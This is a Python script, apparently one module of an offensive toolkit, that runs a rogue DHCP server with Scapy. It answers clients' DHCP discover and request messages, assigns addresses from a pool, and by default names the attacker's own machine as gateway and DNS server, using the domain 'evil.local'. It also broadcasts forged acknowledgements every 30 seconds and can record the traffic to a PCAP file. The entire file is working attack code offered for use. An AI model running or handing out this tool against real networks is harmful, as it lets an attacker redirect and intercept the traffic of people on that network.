from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sniff, sendp, get_if_hwaddr, RandMAC, mac2str
from scapy.all import PcapWriter
import argparse
import threading
import time
import os

dhcp_server_active = False
pcap_writer = None
leased_ips = {}

def execute(args):
    """Execute DHCP spoofing attack with PCAP capture"""
    global dhcp_server_active, pcap_writer
    
    print(f"[DHCP Spoofing] Starting rogue DHCP server on interface {args.interface}")
    
    if args.pcap:
        pcap_path = args.pcap if args.pcap != "default" else os.path.expanduser("~/Fyodost/dhcp_spoofing.pcap")
        os.makedirs(os.path.dirname(pcap_path), exist_ok=True)
        pcap_writer = PcapWriter(pcap_path, append=True, sync=True)
        print(f"[DHCP Spoofing] PCAP capture enabled: {pcap_path}")
    
    try:
        server_ip = args.server_ip if args.server_ip else get_if_addr(args.interface)
        netmask = args.netmask if args.netmask else "255.255.255.0"
        gateway = args.gateway if args.gateway else server_ip
        dns_server = args.dns_server if args.dns_server else server_ip
        domain = args.domain if args.domain else "evil.local"
        
        pool_start = args.pool_start if args.pool_start else "192.168.1.150"
        pool_end = args.pool_end if args.pool_end else "192.168.1.200"
        lease_time = args.lease_time if args.lease_time else 86400
        
        print(f"[DHCP Spoofing] Server IP: {server_ip}")
        print(f"[DHCP Spoofing] IP Pool: {pool_start} - {pool_end}")
        print(f"[DHCP Spoofing] Gateway: {gateway}")
        print(f"[DHCP Spoofing] DNS: {dns_server}")
        print(f"[DHCP Spoofing] Domain: {domain}")
        
        dhcp_server_active = True
        
        handler_thread = threading.Thread(
            target=dhcp_handler,
            args=(args.interface, server_ip, pool_start, pool_end, netmask, gateway, dns_server, domain, lease_time, pcap_writer)
        )
        handler_thread.daemon = True
        handler_thread.start()
        
        if args.announce:
            announce_thread = threading.Thread(
                target=dhcp_announcements,
                args=(args.interface, server_ip, netmask, gateway, dns_server, domain, pcap_writer)
            )
            announce_thread.daemon = True
            announce_thread.start()
            print("[DHCP Spoofing] Sending periodic announcements")
        
        duration = args.duration if args.duration else 300
        print(f"[DHCP Spoofing] Running for {duration} seconds. Press Ctrl+C to stop early.")
        
        time.sleep(duration)
        
        dhcp_server_active = False
        print("[DHCP Spoofing] Server stopped")
        
        if pcap_writer:
            pcap_writer.close()
            print(f"[DHCP Spoofing] PCAP file saved: {pcap_writer.filename}")
        
        return True
        
    except Exception as e:
        print(f"[DHCP Spoofing] Error: {e}")
        dhcp_server_active = False
        if pcap_writer:
            pcap_writer.close()
        return False

def dhcp_handler(interface, server_ip, pool_start, pool_end, netmask, gateway, dns_server, domain, lease_time, pcap_writer):
    """Handle DHCP requests with PCAP capture"""
    print("[DHCP Spoofing] Listening for DHCP requests")
    
    def handle_dhcp(packet):
        if not DHCP in packet or not dhcp_server_active:
            return
        
        if pcap_writer:
            pcap_writer.write(packet)
        
        msg_type = None
        for opt in packet[DHCP].options:
            if opt[0] == 'message-type':
                msg_type = opt[1]
                break
        
        client_mac = packet[Ether].src
        xid = packet[BOOTP].xid
        
        if msg_type == 1: 
            print(f"[DHCP Spoofing] Discover from {client_mac}")
            
            offered_ip = get_available_ip(pool_start, pool_end, client_mac)
            if offered_ip:
                send_dhcp_offer(interface, client_mac, xid, server_ip, offered_ip, netmask, gateway, dns_server, domain, lease_time, pcap_writer)
        
        elif msg_type == 3: 
            print(f"[DHCP Spoofing] Request from {client_mac}")
            
            requested_ip = None
            for opt in packet[DHCP].options:
                if opt[0] == 'requested_addr':
                    requested_ip = opt[1]
                    break
            
            if requested_ip and requested_ip in leased_ips and leased_ips[requested_ip] == client_mac:
                send_dhcp_ack(interface, client_mac, xid, server_ip, requested_ip, netmask, gateway, dns_server, domain, lease_time, pcap_writer)
                print(f"[DHCP Spoofing] Leased {requested_ip} to {client_mac}")
    
    sniff(iface=interface, filter="udp and (port 67 or 68)", prn=handle_dhcp, store=0, 
          stop_filter=lambda x: not dhcp_server_active)

def get_available_ip(pool_start, pool_end, client_mac):
    """Get an available IP from the pool"""
    for ip, mac in leased_ips.items():
        if mac == client_mac:
            return ip
    
    start_parts = pool_start.split('.')
    end_parts = pool_end.split('.')
    
    if len(start_parts) != 4 or len(end_parts) != 4:
        print("[DHCP Spoofing] Invalid IP pool format")
        return None
    
    base = '.'.join(start_parts[:3])
    start = int(start_parts[3])
    end = int(end_parts[3])
    
    for i in range(start, end + 1):
        test_ip = f"{base}.{i}"
        if test_ip not in leased_ips:
            leased_ips[test_ip] = client_mac
            return test_ip
    
    return None

def send_dhcp_offer(interface, client_mac, xid, server_ip, offered_ip, netmask, gateway, dns_server, domain, lease_time, pcap_writer):
    """Send DHCP offer with PCAP capture"""
    offer = (
        Ether(dst=client_mac, src=get_if_hwaddr(interface)) /
        IP(src=server_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, yiaddr=offered_ip, siaddr=server_ip, xid=xid, chaddr=mac2str(client_mac)) /
        DHCP(options=[
            ("message-type", "offer"),
            ("server_id", server_ip),
            ("subnet_mask", netmask),
            ("router", gateway),
            ("name_server", dns_server),
            ("domain", domain),
            ("lease_time", lease_time),
            "end"
        ])
    )
    
    sendp(offer, iface=interface, verbose=False)
    
    if pcap_writer:
        pcap_writer.write(offer)
    
    print(f"[DHCP Spoofing] Offered IP: {offered_ip} to {client_mac}")

def send_dhcp_ack(interface, client_mac, xid, server_ip, offered_ip, netmask, gateway, dns_server, domain, lease_time, pcap_writer):
    """Send DHCP acknowledgment with PCAP capture"""
    ack = (
        Ether(dst=client_mac, src=get_if_hwaddr(interface)) /
        IP(src=server_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, yiaddr=offered_ip, siaddr=server_ip, xid=xid, chaddr=mac2str(client_mac)) /
        DHCP(options=[
            ("message-type", "ack"),
            ("server_id", server_ip),
            ("subnet_mask", netmask),
            ("router", gateway),
            ("name_server", dns_server),
            ("domain", domain),
            ("lease_time", lease_time),
            "end"
        ])
    )
    
    sendp(ack, iface=interface, verbose=False)
    
    if pcap_writer:
        pcap_writer.write(ack)
    
    print(f"[DHCP Spoofing] Acknowledged IP: {offered_ip} to {client_mac}")

def dhcp_announcements(interface, server_ip, netmask, gateway, dns_server, domain, pcap_writer):
    """Send periodic DHCP announcements with PCAP capture"""
    while dhcp_server_active:
        announce = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(interface)) /
            IP(src=server_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, siaddr=server_ip) /
            DHCP(options=[
                ("message-type", "ack"),
                ("server_id", server_ip),
                ("subnet_mask", netmask),
                ("router", gateway),
                ("name_server", dns_server),
                ("domain", domain),
                "end"
            ])
        )
        
        sendp(announce, iface=interface, verbose=False)
        
        if pcap_writer:
            pcap_writer.write(announce)
        
        time.sleep(30)

def add_arguments(parser):
    """Add DHCP spoofing specific arguments to parser"""
    parser.add_argument("--server-ip", help="Rogue DHCP server IP address")
    parser.add_argument("--pool-start", help="DHCP pool start address")
    parser.add_argument("--pool-end", help="DHCP pool end address")
    parser.add_argument("--netmask", help="Network mask")
    parser.add_argument("--gateway", help="Gateway IP address")
    parser.add_argument("--dns-server", help="DNS server IP address")
    parser.add_argument("--domain", help="Domain name")
    parser.add_argument("--lease-time", type=int, help="Lease time in seconds")
    parser.add_argument("--duration", "-d", type=int, help="Attack duration in seconds")
    parser.add_argument("--announce", action="store_true", help="Send periodic announcements")
    parser.add_argument("--pcap", nargs="?", const="default", 
                       help="Enable PCAP capture. Specify path or use default: ~/Fyodost/dhcp_spoofing.pcap")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DHCP Spoofing Attack with PCAP Capture")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--server-ip", help="Rogue DHCP server IP address")
    parser.add_argument("--pool-start", help="DHCP pool start address")
    parser.add_argument("--pool-end", help="DHCP pool end address")
    parser.add_argument("--netmask", help="Network mask")
    parser.add_argument("--gateway", help="Gateway IP address")
    parser.add_argument("--dns-server", help="DNS server IP address")
    parser.add_argument("--domain", help="Domain name")
    parser.add_argument("--lease-time", type=int, default=86400, help="Lease time in seconds")
    parser.add_argument("--duration", "-d", type=int, default=300, help="Attack duration in seconds")
    parser.add_argument("--announce", action="store_true", help="Send periodic announcements")
    parser.add_argument("--pcap", nargs="?", const="default", 
                       help="Enable PCAP capture. Specify path or use default")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[-] This script requires root privileges. Run with sudo.")
        exit(1)
    
    execute(args)